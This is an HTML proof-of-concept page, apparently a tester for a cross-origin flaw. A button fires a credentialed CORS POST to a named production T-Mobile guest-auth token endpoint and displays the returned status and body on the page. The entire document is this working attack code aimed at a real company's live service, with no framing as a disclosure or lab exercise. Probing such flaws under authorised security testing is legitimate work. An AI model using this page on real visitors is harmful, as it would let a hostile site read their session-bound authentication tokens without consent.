<!DOCTYPE html>
<html>
<head>
    <title>T-Mobile Test</title>
</head>
<body style="padding: 50px; background-color: #f0f0f0;">

    <h1 style="color: #e20074;">PoC Tester</h1>
    
    <button id="runBtn" style="padding: 20px; font-weight: bold; cursor: pointer;">
        CLICK TO FIRE REQUEST
    </button>
    
    <hr>
    <h3>Results:</h3>
    <pre id="output" style="background: white; border: 1px solid black; padding: 20px; min-height: 200px;">
        Waiting for user to click button...
    </pre>

    <script>
        document.getElementById('runBtn').onclick = function() {
            var output = document.getElementById('output');
            output.innerText = "Request started... check Network Tab (F12)";

            var target = 'https://adn.t-mobile.com/guest-auth/prd01/guest/v1/tokens?v=' + Date.now();

            fetch(target, {
                method: 'POST',
                mode: 'cors',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({})
            })
            .then(function(response) {
                return response.text().then(function(text) {
                    output.innerText = "Status: " + response.status + "\n\nBody: " + text;
                });
            })
            .catch(function(err) {
                output.innerText = "Fetch Error: " + err;
            });
        };
    </script>

</body>
</html>
